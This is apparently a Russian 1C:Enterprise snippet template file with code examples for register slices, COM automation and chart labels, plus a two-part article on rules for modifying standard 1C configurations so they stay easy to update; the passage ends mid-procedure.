//Определить версию (редакцию) конфигурации
Сообщить(Метаданные.Версия)
"}
},
{1,
{"Срез последних",1,0,"",""},
{0,
{"Срез последних регистра сведений 1с",0,0,"","Срез последних регистра сведений 1с
АВГУСТ 12, 2017 ADMIN КОММЕНТИРОВАТЬ
При использовании периодических регистров сведений в 1с 8 есть возможность получить срез последних на какую либо дату. Он представляет из себя последние данные на указанную дату для уникальной комбинации измерений. Причем срез последних 1с можно взять как по одному измерению, так и по нескольким. По сути это данные регистра, актуальные на указанную дату.

Срез последних можно получить несколькими способами:

При помощи метода СрезПоследних менеджера регистра сведений;
При помощи запроса;
Получить срез последних на дату при помощи метода СрезПоследних
Рассмотрим на примере получение среза на дату по регистру ЦеныНоменклатуры, по конкретной заданной номенклатуре при помощи метода СрезПоследних.

Синтаксис метода:

ТЗ = РегистрыСведений.ИмяРегистраСведений.СрезПоследних(<КонецПериода>, <Отбор>);
КонецПериода — дата на которую делается срез;
Отбор — структура с отбором по измерениям регистра;
Метод возвращает таблицу значений, заполненную данными найденных строк регистра.

Пример. Пусть в переменной Номенклатура хранится позиция номенклатуры по которой необходимо получить данные, а в переменной Дата хранится дата на которую необходимо получить цены. Данный пример подходит для конфигурации Бухгалтерия (ред. 2.0 / 3.0).

Отбор = Новый Структура(""Номенклатура"", Номенклатура);
ТаблицаЦен = РегистрыСведений.ЦеныНоменклатуры.СрезПоследних(Дата, Отбор);
Для Каждого Стр Из ТаблицаЦен Цикл
      Сообщить(""Тип цен: ""+Стр.ТипЦен+"" Цена: "" + Стр.Цена);     
КонецЦикла;
Получить срез последних регистра сведений запросом
Рассмотрим пример среза последних по регистру сведений в запросе. Для примера возьмем регистр ЦеныНоменклатуры из конфигурации Бухгалтерия (ред. 2.0 / 3.0). В запросе будем использовать виртуальную таблицу СрезПоследних нужного регистра. В первый параметр таблицы передается дата, на которую необходим срез, во втором можно задать произвольное условие для полей регистра.

Пример 2:

Запрос = Новый Запрос;
Запрос.УстановитьПараметр(""ДатаСреза"", КонецМесяца(ТекущаяДата()));

Запрос.Текст = ""ВЫБРАТЬ
|    ЦеныНоменклатуры.Номенклатура,
|    ЦеныНоменклатуры.ТипЦен,
|    ЦеныНоменклатуры.Цена
|ИЗ
|РегистрСведений.ЦеныНоменклатуры.СрезПоследних(&ДатаСреза) КАК ЦеныНоменклатуры"";

Результат = Запрос.Выполнить().Выгрузить();
Срез последних на каждую дату в запросе 1с
Бывают ситуации, когда срез регистра сведений необходимо получить не на конкретную дату, а на несколько дат. Но в запросе, в виртуальную таблицу можно передать только одну дату. В следующем примере будет показано, как это сделать.

Пример 3. По номенклатуре, необходимо получить все реализации за период и определить какая цена была установлена на данную номенклатуру в момент продажи по типу цен из реализации.

Запрос = Новый Запрос;
Запрос.УстановитьПараметр(""Конец"",  КонецПериода); 
Запрос.УстановитьПараметр(""Начало"", НачалоПериода); 
Запрос.УстановитьПараметр(""Номенклатура"", Номенклатура);
Запрос.Текст = 
""ВЫБРАТЬ
|	РеализацияТоваровУслугТовары.Ссылка,
|	РеализацияТоваровУслугТовары.Ссылка.ТипЦен,
|	РеализацияТоваровУслугТовары.Номенклатура,
|	МАКСИМУМ(ЦеныНоменклатуры.Период) КАК Период
|ПОМЕСТИТЬ ПервичныеДанныеЦен
|ИЗ
|	Документ.РеализацияТоваровУслуг.Товары КАК РеализацияТоваровУслугТовары
|	ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.ЦеныНоменклатуры КАК ЦеныНоменклатуры
|	ПО РеализацияТоваровУслугТовары.Номенклатура = ЦеныНоменклатуры.Номенклатура
|	    И РеализацияТоваровУслугТовары.Ссылка.ТипЦен = ЦеныНоменклатуры.ТипЦен
|	    И РеализацияТоваровУслугТовары.Ссылка.Дата >= ЦеныНоменклатуры.Период
|ГДЕ
|	РеализацияТоваровУслугТовары.Номенклатура = &Номенклатура
|	И РеализацияТоваровУслугТовары.Ссылка.Проведен
|	И РеализацияТоваровУслугТовары.Ссылка.Дата МЕЖДУ &Начало И &Конец
|
|СГРУППИРОВАТЬ ПО
|	РеализацияТоваровУслугТовары.Ссылка,
|	РеализацияТоваровУслугТовары.Номенклатура,
|	РеализацияТоваровУслугТовары.Ссылка.ТипЦен
|;
|
|////////////////////////////////////////////////////////////////////////////////
|ВЫБРАТЬ
|	ПервичныеДанныеЦен.Ссылка,
|	ПервичныеДанныеЦен.ТипЦен,
|	ПервичныеДанныеЦен.Номенклатура,
|	ЕСТЬNULL(ЦеныНоменклатуры.Цена, 0) КАК Цена
|ИЗ
|	ПервичныеДанныеЦен КАК ПервичныеДанныеЦен
|	ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.ЦеныНоменклатуры КАК ЦеныНоменклатуры
|	    ПО ПервичныеДанныеЦен.Номенклатура = ЦеныНоменклатуры.Номенклатура
|		И ПервичныеДанныеЦен.ТипЦен = ЦеныНоменклатуры.ТипЦен
|		И ПервичныеДанныеЦен.Период = ЦеныНоменклатуры.Период"";
Вкратце принцип действия данного механизма следующий:

Выбираем все нужные нам документы, либо просто необходимые даты;
Присоединяем к ним регистр по нужным измерениям;
Также в связях указываем, что нам нужны данные регистра с периодом меньше либо равным дате документа (или просто необходимой даты);
При помощи группировки находим максимальную из подходящих дат;
Еще раз присоединяем регистр по всем нужным измерениям, но на этот раз по конкретной дате;
Таким образом на каждую изначальную строку с датой мы получим срез последних регистра сведений.
Если хотите подробней узнать о периодических регистрах сведений зайдите на сайт 1С:ИТС"}
}
},
{0,
{"WSHShell.SendKeys",0,0,"","WSHShell 	= Новый COMОбъект(""WScript.Shell"");
WSHShell.SendKeys(""% "");
WSHShell.SendKeys(""{UP}{UP}{ENTER}"");
WSHShell 	= Неопределено;"}
},
{0,
{"В данном COM-объекте JavaScript выполняется на html странице",0,0,"","Функция ПолучитьСумму(Число1, Число2)
	
	Текст 	= ""<script type='text/javascript'>
	|var summa = "" + Число1 + "" + "" + Число2 + "";
	|document.write(summa);
	|</script>"";
	
	НовыйHTMLДокумент 	= Новый COMОбъект(""HtmlFile"");
	НовыйHTMLДокумент.open(""text/html"");
	НовыйHTMLДокумент.write(Текст);
	НовыйHTMLДокумент.close();
	
	Возврат НовыйHTMLДокумент.documentElement.outerText;
	
КонецФункции "}
},
{1,
{"График",1,0,"",""},
{0,
{"Точки на графике",0,0,"","ВыводитьТочек 	= 5; 
ВсегоТочек 		= График.Точки.Количество();
Шаг 			= Цел(ВсегоТочек/ВыводитьТочек);

//текст точки с индексом 0 надо очистить отдельно, если нужно

Для Точка = 1 По ВсегоТочек-1 Цикл 
	Если Цел(Точка / Шаг) * Шаг <> Точка Тогда
		График.Точки[Точка].Текст 	= """";
	КонецЕсли;	
КонецЦикла;	"}
}
},
{0,
{"Замена в запросе",0,0,"","Запрос.ТекстЗапроса 	= СтрЗаменить(Запрос.ТекстЗапроса, ""<?""Строка в запросе для замены (вида, Список.Ссылка КАК Ссылка,)"">"",
""""<?""Строка в запросе для замены (вида, Список.Ссылка КАК Ссылка,)"">""
|	""<?""Строка в запросе для замены (вида, Список.Ссылка КАК Ссылка,)"">""1"");"}
},
{0,
{"Правила доработки типовых конфигураций 1С для облегчения их дальнейшего обновления (часть 1)",0,0,"","Правила доработки типовых конфигураций 1С для облегчения их дальнейшего обновления (часть 1)
http://tavalik.ru/pravila-razrabotki-chast-1/
Опубликовано 26.07.2016 автором Виталий Онянов
Logo_1c_8_Razradotka

Почти все проекты почти в любой крупной компании-интеграторе 1С заключаются в доработке типовых конфигураций и направлены, в основном, на оптимизацию учета хозяйственной деятельности организации и сдачи соответственной регламентированной отчетности. А это, в свою очередь означает, что в дальнейшем внедряемые решения необходимо будет дорабатывать в соответствии с часто меняющимся законодательством. На практике это почти всегда означает обновление релизов типовых конфигураций, на основе которых выполнялось решение, и адаптация уже выполненных модификаций в соответствии с изменениями очередного релиза.

Часто проект нельзя назвать вполне успешным, если клиент не остался в организации-интеграторе на поддержке. И если придерживаться строгих правил изменения типовых конфигураций, то потратив совсем незначительное время на этапе разработки, можно сэкономить много-много часов и нервов в будущем на постоянном обновлении измененной конфигурации. И наоборот, грубое, «наплевательское» отношение к оформлению кода, выбор более быстрых и простых, а не правильных способов реализации задач могут превратить обновление получившейся конфигурации в настоящий ад для поддержки. В дальнейшем это выльется в огромные часы обновления, резкую загруженность разработчиков в отчетный период, большое количество ошибок после обновления, недовольство клиентов и т. д.

Ниже представлен набор правил разработки в типовых конфигурациях, который позволит значительно облегчить дальнейшее обновление конфигурации. Данный свод родился постепенно из многолетнего опыта большого числа разработчиков одной замечательной компании, и, по моему глубочайшему убеждению, должен быть обязательным для всех разработчиков, независимо от того, в каком отделе / проекте / направлении они работают.


0. Оглавление списка правил разработки:
Концепция минимизации «разрушений» типовой конфигурации
Комментирование изменений кода
Вставка кода
Удаление кода
Изменение существующего кода
Добавление процедур и функций в модуле
Добавление объектов верхнего уровня
Добавление подчиненных объектов
В типовые объекты конфигурации
В объекты, добавленных в рамках проекта
Добавление предопределенных элементов
В типовые объекты конфигурации
В объекты, добавленных в рамках проекта
Использование общих модулей и их строгая структура
Использование подписок и их строгая структура
Редактирование форм
Типовых объектов
Объектов, добавленных в рамках проекта
Принципы работы с ролями
Внешние отчеты и обработки
1. Концепция минимизации «разрушений» типовой конфигурации
Если модифицируемую типовую конфигурацию предполагается обновлять по мере выпуска новых релизов, то разработчикам следует всегда помнить об этом и принимать меры по облегчению обновления. Следует всегда выбирать те способы решения задач, которые обеспечат более простое обновление конфигурации в будущем, даже если они несколько сложнее в реализации. Конечно, только при условии, что у более удобного для обновления способа нет серьёзных недостатков в области производительности, понятности кода и т. д.

2. Комментирование изменений кода:
Абсолютно все изменения программного кода модулей должны комментироваться. Блок строк, подвергшийся изменению, должен быть обрамлён строками-комментариями особого формата. Принцип формирования этих строк показан на примере:

//++ VION 20.07.2016 0001234 Доработка на старте
//-- VION 20.07.2016
Где

//++ — начало блока
//— — конец блока
VION — имя (или ник) разработчика
0001234 — номер задачи по трекеру, ставится только в открывающем комментарии, чтобы в результаты глобального поиска по номеру задачи каждое изменение кода попадало только один раз
Доработка на старте — произвольный комментарий, используется при необходимости, но если номер задачи отсутствует, то краткий пояснительный текст обязателен
Комментарии призваны выделять модификации по сравнению с типовым функционалом. Если разработчик изменяет текст своей собственной модификации через некоторое время в рамках этой же задачи, то такие изменения отдельно не комментируются (и имеющийся внешний комментарий тоже не изменяется). Если разработчик вносит изменения в свой текст, но уже по другой задаче или изменяется код, написанный другим разработчиком, то комментирование следует использовать обязательно.

Обрамляющие комментарии выравниваются по левому краю редактируемого блока кода. Способы использования комментирования изменений продемонстрированы на примерах ниже:

2.1 Вставка кода
Пример:

Процедура ПриОткрытии()
    Если ЭтоНовый() Тогда
        ЗаполнитьПоляПоУмолчанию();
    КонецЕсли;
    НастроитьЭлементыФормы();
    //++ VION 20.07.2016 0001234
    НастроитьДополнительныеЭлементы();
    //-- VION 20.07.2016
    УстановитьВидимостьПолей();
КонецПроцедуры
2.2 Удаление кода
Пример:

Процедура ПриОткрытии()
    //++ VION 20.07.2016 0001234
    //Если ЭтоНовый() Тогда
    //    ЗаполнитьПоляПоУмолчанию();
    //КонецЕсли;
    НастроитьДополнительныеЭлементы();
    //-- VION 20.07.2016
    УстановитьВидимостьПолей();
КонецПроцедуры
2.3 Изменение существующего кода
При изменении существующего кода сначала обязательно комментируется старый блок, затем пишется новый вариант.

Пример:

Процедура ПриОткрытии()
    Если ЭтоНовый() Тогда
        //++ VION 20.07.2016 000123
        //ЗаполнитьПоляПоУмолчанию();
        НастройкаЗаполненияПолей = ПолучитьНастройкуЗаполненияПолей();
        ЗаполнитьПоляПоУмолчаниюРасширенная(НастройкаЗаполненияПолей);
        //-- VION 20.07.2016
    КонецЕсли;
    НастроитьЭлементыФормы();
    УстановитьВидимостьПолей();
КонецПроцедуры
2.4 Добавление процедур и функций в модуле
Для добавляемых процедур и функций, а также для объявления переменных модуля типовых объектов действуют дополнительные правила оформления комментариев:

Комментируется не блок добавленных процедур в целом, а каждая добавленная процедура или функция в отдельности.
Открывающий комментарий идёт на строке, предшествующей заголовку процедуры или функции, а закрывающий комментарий идёт на той же строке, где написано «Конец процедуры» или «Конец процедуры», через пробел.
Комментирование изменений внутри существующих процедур осуществляется по общим правилам.
Пример:

//++ VION 20.07.2016 000123
Перем мНастройкаЗаполненияПолей; //-- VION 20.07.2016

//++ VION 20.07.2016 000123
Процедура ДоработатьФормуПрограммно()
    ...
    ...
КонецПроцедуры //-- VION 20.07.2016

//++ VION 20.07.2016 000123
Процедура ДатаОтгрузкиОбработкаВыбора()
    ...
    ...
КонецПроцедуры //-- VION 20.07.2016
Данное правило позволяет легко переносить изменения в модуле в «попроцедурном сравнении» конфигураций.

pravila-razrabotki-tipovyx-konfiguracij_002

Если же закрывающий комментарий поставить на следующей строке:

pravila-razrabotki-tipovyx-konfiguracij_003

То при «попроцедурном сравнении» данный комментарий будет признан описанием следующей по тексту процедуры, которая будет считаться измененной.

pravila-razrabotki-tipovyx-konfiguracij_001

3. Добавление объектов верхнего уровня
Имена объектов верхнего уровня, создаваемых в конфигурации, обязательно должны начинаться с префикса вашей компании или отдельного префикса проекта. Как правило, он состоит из двух-трех заглавных букв и подчёркивания, например АБ_. Соответственно, создаваемые объекты будут называться АБ_НовыйСправочник, АБ_НовыйРегистрСведений, АБ_НовыйДокумент и т. д.

Синонимы (видимые пользователю имена) добавленных объектов верхнего уровня должны начинаться с префикса, заключённого в круглые скобки: (АБ). В результате эти объекты будут визуально выделяться в списках и сгруппировано располагаться в их начале (что облегчает и тестирование, и использование).

pravila-razrabotki-tipovyx-konfiguracij_005

В комментарии создаваемого объекта следует указать имя разработчика, дату и номер задачи, по аналогии с заголовочным комментарием добавляемого кода, но без знаков «++». Это обеспечит привязку объекта конфигурации к задаче, отыскиваемую глобальным поиском.

Пример: Создать справочник «Проекты».

Действия разработчика: в конфигурации создается следующий справочник:

Имя: АБ_Проекты
Синоним: (АБ) Проекты
Комментарий: // VION 20.07.2016 000123
pravila-razrabotki-tipovyx-konfiguracij_004

4. Добавление подчиненных объектов
Способ добавления реквизитов объектов конфигурации зависит от того, в какой объект конфигурации добавляется реквизит: в объект конфигурации, созданный поставщиком типового решения (т. е. объект на поддержке) или объекта, добавленного в рамках текущего проекта (т. е. уже имеющего префикс).

4.1 Добавление подчиненных объектов в типовые объекты конфигурации
Подчинённые объекты, добавляемые в существующие (типовые) объекты конфигурации, должны снабжаться префиксами: АБ_ДополнительныйРеквизит, АБ_НоваяТабличнаяЧасть, АБ_ФормаНастроекПользователя, АБ_МакетСпециальнаяНакладная. Но при этом синонимы таких подчинённых объектов создаются без префикса.

В комментарии создаваемого объекта следует указать имя разработчика, дату и номер задачи, по аналогии с оформлением созданного модуля. Это обеспечит привязку объекта конфигурации к задаче, отыскиваемую глобальным поиском.

Пример: Создать реквизит «Проект» документа «Авансовый платеж».

Действия разработчика: в конфигурации создается следующий реквизит:

Имя: АБ_Проект
Синоним: Проект
Комментарий: // VION 20.07.2016 000123
pravila-razrabotki-tipovyx-konfiguracij_006

4.2 Добавление подчиненных объектов в объекты, добавленные в рамках проекта
Подчиненные объекты, добавляемые в объекты верхнего уровня добавленные в конфигурацию в рамках проекта, т. е. уже содержащие в имени префикс, добавляются без префикса. Синонимы таких подчиненных объектов создаются также без префикса.

В комментарии создаваемого объекта следует указать имя разработчика, дату и номер задачи, по аналогии с оформлением созданного модуля. Это обеспечит привязку объекта конфигурации к задаче, отыскиваемую глобальным поиском. Комментарий можно не указывать, если реквизиты создаются в рамках той же задачи, что и сам объект верхнего уровня.

Пример: Создать реквизит «Ответственный» у справочника «(АБ) Проекты».

Действия разработчика: Если задача отличная от той, в которой создавался справочник «(АБ) Проекты», то в конфигурации создается следующий реквизит:

Имя: Ответственный
Синоним: Ответственный
Комментарий: // VION 20.07.2016 000456
pravila-razrabotki-tipovyx-konfiguracij_007

5. Добавление предопределенных элементов
При добавлении предопределенных элементов справочников, планов видов характеристик и планов счетов следует использовать те же правила, что и при добавлении подчиненных объектов (табличных частей, реквизитов) в объекты верхнего уровня.

5.1 Добавление предопределенных элементов в типовые объекты конфигурации
Предопределенные элементы для типовых объектов конфигурации обязательно добавляются с префиксом. Наименование задается без префикса.

Пример: В план счетов «Хозрасчетный» добавить предопределенный счет 10.15 — Бланки строгой отчетности.

Действия разработчика: Добавить следующий предопределенный счет:

Имя: АБ_БланкиСрогойОтчетности
Код: 10.15
Наименование: Бланки строгой отчетности
pravila-razrabotki-tipovyx-konfiguracij_016

Если необходимо переименовать предопределенный элемент типового объекта конфигурации (например, счет), следует оставить сам объект без изменений, а переименование выполнить программно в специальной обработке инициализации.

5.2 Добавление предопределенных элементов в объекты, добавленные в рамках проекта
В объекты конфигурации добавленные в рамках проекта, т. е. уже содержащие в своем имени префикс, предопределенные элементы добавляются без префикса в имени и наименовании.

6. Использование общих модулей и их строгая структура
Неоднократно используемые в конфигурации процедуры и функции, обработчики подписок и регламентных заданий размещаются в общих модулях. Для этих целей следует добавлять собственные модули, добавленные по правилам добавления объектов верхнего уровня, оставляя типовые модули неизменными. При разработке будут полезны следующие общие модули («АБ_» — префикс):

АБ_ОбщегоНазначения (клиент, сервер, внешнее соединение) — для размещения обычных процедур и функций.
АБ_Серверный (только сервер) — для процедур и функций, которые обязательно должны исполняться в среде сервера.
АБ_Глобальный — для процедур и функций, вызов которых стандартным способом (через имя модуля и точку) неудобен.
АБ_Привилегированный — для процедур и функций, которые всегда нужно исполнять под полными правами.
АБ_ПовторноеИспользование — для кэширования возвращаемых значений некоторых функций.
pravila-razrabotki-tipovyx-konfiguracij_008

В отдельные общие модули можно выносить код функциональных блоков большого объёма, в этом случае упрощается отладка такого кода при использовании хранилища конфигурации. В остальных случаях, разработчику следует убедиться в наличии подходящего общего модуля перед добавлением нового модуля в конфигурацию.

7. Использование подписок и их строгая структура
Для обработки различных событий, связанных с объектами типовой конфигурации, следует использовать механизм подписок вместо внесения модификации в модули самих объектов, если есть такая возможность.

Для каждого события может быть не более одной подписки (как объекта метаданных), обработчик которой и связанный с ним код должны размешаться в отдельном общем модуле (для повышения параллельности работы разработчиков с хранилищем). Имя подписки и имя общего модуля должны быть одинаковы и соответствовать обрабатываемому событию. В качестве источника подписки указываются все потенциально возможные для обработки объекты (все справочники, все документы и т. п.).

Процедура-обработчик подписки должна содержать вызовы подпроцедур, выполняющих нужные действия. Обращение к ним осуществляется в зависимости от типа источника, а также в нужной последовательности. Комментирование в модуле подписки при добавлении кода по новым задачам осуществляется по общим правилам.

Пример: При проведении документа «Авансовый платеж», делать записи в регистр накопления «(АБ) Затраты по проектам».

Действия разработчика:

1. Создать подписку «АБ_ДокументыОбработкаПроведения» (если такая подписка не была создана раннее), в качестве источника указать все документы, событие — «ОбработкаПроведения».

pravila-razrabotki-tipovyx-konfiguracij_009

2. Создать общий серверный модуль «АБ_ДокументыОбработкаПроведения».

pravila-razrabotki-tipovyx-konfiguracij_010

3.  В модуле создать экспортную процедуру «ОбработкаПроведения». Выбрать данную процедуру в качестве обработчика созданной ранее подписки. В процедуре, в зависимости от типа документа, вызываются необходимые обработчики.

pravila-razrabotki-tipovyx-konfiguracij_011

4. Модуль документа «Авансовый платеж» должен остаться без изменений.

8. Редактирование форм
8.1 Редактирование форм типовых объектов
Если изменение типовой формы (как обычной, так и управляемой) небольшое (например, вынести на форму несколько новых реквизитов), то выполнять такое изменение следует полностью программно. Т. е. изменения вносятся только в модуль формы, а сама форма в конфигураторе остается неизменной. Некоторым разработчикам такой метод редактирования форм поначалу может показаться довольно трудоемким. Однако, имея достаточный опыт программного изменения форм, на добавление одного элемента будет уходить не более 3-5 минут. Затраченное время многократно окупается при последующих обновлениях типовой конфигурации.

Пример: На основную форму документа «Авансовый платеж», добавить реквизит «(АБ) Проект».

Действия разработчика: В обработчике формы «ПриСозданииНаСервере» добавить процедуру «ДоработатьФормуПрограммно()». В данной процедуре добавить нужный элемент в элементы формы.

pravila-razrabotki-tipovyx-konfiguracij_012

Возможно создание отдельного модуля, в котором будут содержаться все необходимые процедуры и функции для изменения типовых форм.

pravila-razrabotki-tipovyx-konfiguracij_013

В типовых конфигурациях на базе БСП 2, уже есть специальный функционал для данных целей:

pravila-razrabotki-tipovyx-konfiguracij_017

В процедуре «ПриСозданииНаСервере» общего модуля «МодификацияКонфигурацииПереопределяемый» можно вызвать свой обработчик.

pravila-razrabotki-tipovyx-konfiguracij_018

Где по имени формы можно вызвать необходимую процедуру с программной доработкой формы.

pravila-razrabotki-tipovyx-konfiguracij_019

Если же на форму планируется добавить большое количество элементов или табличных частей, то возможно и ручное изменение формы. В этом случае рекомендуется создать на форме отдельную вкладку, и уже на ней размещать все необходимые элементы. Это значительно облегчит дальнейшее обновление формы.

8.2 Редактирование форм объектов, добавленных в рамках проекта
Формы объектов, добавленных в рамках проекта (т. е. имеющие в своем названии префикс) редактируются обычным способом.

9. Принципы работы с ролями
Типовые роли всегда следует оставлять неизменными (если это возможно). Это нужно для облегчения обновления изменённой конфигурации из новых релизов, потому что сравнение и восстановление ролей является сложным и кропотливыми процессом.

Права на добавляемые в конфигурацию объекты следует назначать в новых, создаваемых для этой цели ролях.

Запреты на доступ к данным, разрешенным типовыми ролями, следует реализовывать программным способом, пока это возможно. И только когда подобный запрет будет очень сложно реализовать программно (либо такое решение будет ненадёжным), допустимо модифицировать типовые роли. Изменения типовых ролей должны быть минимально необходимыми и документированными. Например, если необходимо изменить текст ограничений доступа в роли (RLS), то согласно общим правилам, следует закомментировать весь типовой код, после чего добавить код с необходимыми изменениями.

pravila-razrabotki-tipovyx-konfiguracij_014

10. Внешние отчеты и обработки
Большинство доработок в системе может быть выполнено с помощью механизма Дополнительных отчетов и обработок.

pravila-razrabotki-tipovyx-konfiguracij_015

В конфигурациях на основе БСП 2 (ERP, УТ 11, БП 3.0, ЗУП 3.0 и т. д) этот механизм значительно расширен. С его помощью без изменения конфигурации возможно создавать внешние отчеты и обработки (с размещением команды запуска в командном интерфейсе и возможностью настройки доступа различным пользователям), обработки заполнения документа, обработки создания документа на основании, дополнительные печатные формы и др.

Разработчикам рекомендуется активно использовать механизм Дополнительных отчетов и обработок, когда это возможно."}
},
{0,
{"Правила доработки типовых конфигураций 1С для облегчения их дальнейшего обновления (часть 2)",0,0,"","Правила доработки типовых конфигураций 1С для облегчения их дальнейшего обновления (часть 2)
Опубликовано 05.10.2016 автором Виталий Онянов
Logo_1c_8_Razradotka

Продолжаем знакомиться с правилами доработки типовых конфигураций, соблюдение которых позволяет значительно облегчить последующее обновление и поддержку измененных конфигураций.

Первую часть читайте здесь. В этой статье будет рассказано о некоторых приемах и методах, которые, по моему мнению, обязательно должны присутствовать в редактируемой конфигурации вне зависимости от масштаба проекта.


0. Оглавление
Использование хранилища конфигураций
Самоидентификация тестовых баз
Обработка инициализации
Справочник предопределённых значений
Просмотр временных таблиц в отладчике
Версии внешних отчётов и обработок
1. Использование хранилища конфигураций
Разработка обязательно должна вестись с использованием хранилища конфигурации. В некоторых случаях хранилищ конфигураций может быть несколько. Например, в схеме ниже используется 2 независимых хранилища:

Для разработочных и одной тестовой базы.
Для рабочей базы и специальной базы — сборки.
pravila-razrabotki-tipovyx-konfiguracij-chast2__001

В этом случае задача с момента начала разработки до переноса в продуктивную базу проходит следующие этапы:

Разработка ведется в одной из разработочных баз
После выполнения, задача помещается в разработочное хранилище конфигурации
Далее, через хранилище задача попадает в тестовую базу (Тестовая 1)
Если по задаче есть замечания, разработчик исправляет их в своей разработочной базе, а затем через хранилище снова передает изменения на тест в тестовую базу.
Когда все этапы тестирования пройдены, разработчик сохраняет файл конфигурации из тестовой базы и посредством сравнения / объединения конфигураций переносит свою задачу в специальную базу — сборку.
В сборке происходит дополнительный тест задачи (после переноса).
Затем, все затронутые объекты помещаются в хранилище рабочей базы и сборки.
В назначенное время все задачи помещенные в хранилище переносятся в рабочую базу.
На совсем небольших проектах возможно подключение всех баз к одному общему хранилищу конфигурации:

pravila-razrabotki-tipovyx-konfiguracij-chast2__002

2. Самоидентификация тестовых баз
В проекте часто имеется несколько тестовых и разработочных баз. Они периодически обновляются выгрузками из рабочей базы. В связи с этим, для снижения риска порчи данных и повышения удобства работы, полезен следующий функционал. Информационная база хранит реквизиты рабочей базы (имя базы, имя сервера или полный путь подключения) — например, в константе.

pravila-razrabotki-tipovyx-konfiguracij-chast2__003

pravila-razrabotki-tipovyx-konfiguracij-chast2__004

В результате каждая копия может определить, является она рабочей базой или нет.

Если база — не рабочая, то:

При начале работы системы в заголовок главного окна нужно автоматически добавить информацию о том, что данная база является тестовой.
Не должен выполняться код обработчиков некоторых регламентных заданий. Например, проверка на рабочую базу должна осуществляться для всех регламентных заданий, выполняющий периодический обмен с внешними системами. При необходимости отладки таких заданий константу можно изменить на реквизиты данной тестовой базы (после изменения настроек обмена).
Функцию проверку можно добавить, например, в процедуру «ПриНачалеРаботыСистемы()» модуля управляемого приложения.

Процедура ПриНачалеРаботыСистемы()

    // СтандартныеПодсистемы
    СтандартныеПодсистемыКлиент.ПриНачалеРаботыСистемы();
    // Конец СтандартныеПодсистемы

    //++ VION 08.09.2016 Общие объекты
    АБ_ОбщегоНазначенияКлиент.УстановитьЗаголовокИнформационнойБазы();
    //-- VION 08.09.2016

КонецПроцедуры
Где процедура «УстановитьЗаголовокИнформационнойБазы()» имеет следующий вид:

//**************************************************
Процедура УстановитьЗаголовокИнформационнойБазы() Экспорт
    Если АБ_ОбщегоНазначенияСервер.ЭтоРабочаяБаза() Тогда
        Возврат;
    КонецЕсли;
    ИмяИнформационнойБазы = АБ_ОбщегоНазначенияСервер.ПолучитьИмяИнформационнойБазы();
    УстановитьКраткийЗаголовокПриложения(""(! ""+ИмяИнформационнойБазы+"" !)"");
КонецПроцедуры
Также в этом примере используются следующие серверные процедуры:

//**************************************************
Функция ЭтоРабочаяБаза() Экспорт
    Если Врег(ПолучитьИмяИнформационнойБазы() )= Врег(СокрЛП(Константы.АБ_ИмяРабочейБазы.Получить())) Тогда
        Возврат Истина;
    Иначе
        Возврат Ложь;
    КонецЕсли;
Конецфункции

//**************************************************
Функция ПолучитьИмяИнформационнойБазы() Экспорт

    СтрокаПодключения = СтрокаСоединенияИнформационнойБазы();

    НомерСимвола = СтрНайти(СтрокаПодключения,""File="");
    Если НомерСимвола > 0 Тогда
        //Это Файловая база
        СтрокаСправа = Сред(СтрокаПодключения,НомерСимвола+6);
        Возврат Сред(СтрокаСправа,1,СтрДлина(СтрокаСправа)-2);
    КонецЕсли;

    НомерСимвола = СтрНайти(СтрокаПодключения,""Ref="");
    Если НомерСимвола > 0 Тогда
        //Это серверная база
        СтрокаСправа = Сред(СтрокаПодключения,НомерСимвола+5);
        Возврат Сред(СтрокаСправа,1,СтрДлина(СтрокаСправа)-2);
    КонецЕсли;

    Возврат """";

Конецфункции
Результат:

pravila-razrabotki-tipovyx-konfiguracij-chast2__005

Обработчик регламентного задания, связанного с обменом данными, должен иметь соответствующую проверку:

//**************************************************
Процедура ВыполнитьОбменДанными() Экспорт

    Если НЕ АБ_ОбщегоНазначенияСервер.ЭтоРабочаяБаза() Тогда
        Возврат;
    КонецЕсли;

    //... Код регламентной процедуры

Конецфункции
3. Обработка инициализации
Некоторые модификации требуют действий, которые нельзя выполнить в конфигураторе. Например, заполнение реквизитов предопределённых элементов справочника (помимо кода и наименования), обязательное первоначальное заполнение каких-либо значений. Все подобные действия по разным задачам проекта следует выполнять в одном месте — в обработке инициализации.

Для данной обработки должны соблюдаться следующие правила:

Обработка должна быть доступна только пользователям с полными правами.
Отдельное вынесение в интерфейс данной обработки не требуется.
Обработка должна иметь одну форму с кратким пояснительным текстом и кнопкой вызова процедуры выполнения пакета инициализационных действий.
Данная процедура должна быть доступна для программного вызова извне.
Процедура выполнения пакета должна последовательно вызвать подпроцедуры инициализации, написанные разными разработчиками в рамках своих задач. В каждой из них должна быть собственная (независимая) обработка исключительных ситуаций, с выдачей сообщений об ошибках.
Ошибка, возникшая в одной в подпроцедуре, не должна влиять на остальную инициализацию.
Обработку предполагается запускать многократно. Каждое действие должно корректно отрабатывать как при первом запуске обработки, так и при повторных запусках. Во втором случае не должно быть каких-либо побочных эффектов или потери введённых пользователем данных.
В конфигурацию также должен быть добавлен механизм автоматического обнаружения изменений в обработке инициализации и предложения пользователю с полными правами выполнить инициализацию при первой же возможности.

Один из вариантов реализации такого механизма:

pravila-razrabotki-tipovyx-konfiguracij-chast2__008

В конфигурации предусматривается константа, хранящая версию последней выполненной обработки инициализации.
В обработке предусматривается экспортная переменная, хранящая версию (целое число). Версия устанавливается при создании обработки-объекта, значение версии прописано в коде модуля. При любой модификации обработки разработчик должен увеличить данную версию на единицу.
При начале работы системы, если текущий пользователь имеет полные права и версии обработки в конфигурации и в константе отличаются, выполняется обработка инициализации.
В данном примере, добавлена константа «АБ_ВерсияВыполненнойОбработкиИнициализации»

pravila-razrabotki-tipovyx-konfiguracij-chast2__007

В модуле управляемого приложения в процедуру «ПриНачалеРаботыСистемы()» добавлен вызов серверной процедуры:

Процедура ПриНачалеРаботыСистемы()

    // СтандартныеПодсистемы
    СтандартныеПодсистемыКлиент.ПриНачалеРаботыСистемы();
    // Конец СтандартныеПодсистемы

    //++ VION 08.09.2016 Общие объекты
    АБ_ОбщегоНазначенияКлиент.УстановитьЗаголовокИнформационнойБазы();
    АБ_ОбщегоНазначенияСервер.ВыполнитьОбработкуИнициализации();
    //-- VION 08.09.2016

КонецПроцедуры
Которая проверяет наличие прав и вызывает обработку инициализации:

//**************************************************
Процедура ВыполнитьОбработкуИнициализации() Экспорт

    Если РольДоступна(""ПолныеПрава"") Тогда
